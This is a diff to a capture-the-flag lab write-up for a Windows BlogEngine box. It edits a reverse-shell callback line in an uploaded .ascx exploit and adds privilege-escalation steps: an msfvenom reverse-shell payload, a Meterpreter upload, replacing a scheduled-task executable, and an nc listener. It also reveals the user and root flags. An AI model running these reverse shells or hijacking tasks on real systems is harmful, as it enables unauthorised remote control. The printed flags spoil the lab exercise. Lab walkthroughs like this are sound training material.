@@ -48,7 +48,7 @@ __VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB
 
 ### Who is the webserver running as?
 
-- First, set the reverse shell IP in the exploit code
+- Set the reverse shell IP in the exploit code
     - Edit this line: `System.Net.Sockets.TcpClient("10.10.10.20", 4445))`
 - Rename the file to PostView.ascx
 - Upload to blogengine portal
@@ -101,6 +101,20 @@ __VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB
 
 ### What is the user flag?
 
-- 
+- Backup the *Message.exe* file using `cp Message.exe Message.exe.bak` within Meterpreter shell
+- Generate a new reverse shell with a different port using `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=<attack machine port> -f exe > shell.exe` (replace LPORT value with a port different from the one used for the meterpreter shell)
+- `upload <filepath to new shell.exe>` within *meterpreter* to upload the new shell
+- `mv shell.exe Message.exe` to replace Message.exe with malicious payload
+- `nc -lvnp <chosen port>` and wait for Windows Scheduler to run payload as Administrator
+- Navigate to `C:\Users\jeff\Desktop` and read the user flag
+
+> <details><summary>The user flag is </summary>759bd8af507517bcfaede78a21a73e39</details>
 
 ### What is the root flag?
+
+- Navigate to `C:\Administrator\Desktop`
+
+> <details><summary>The root flag is </summary>7e13d97f05f7ceb9881a3eb3d78d3e72</details>
+
+## Privilege Escalation without Metasploit
+
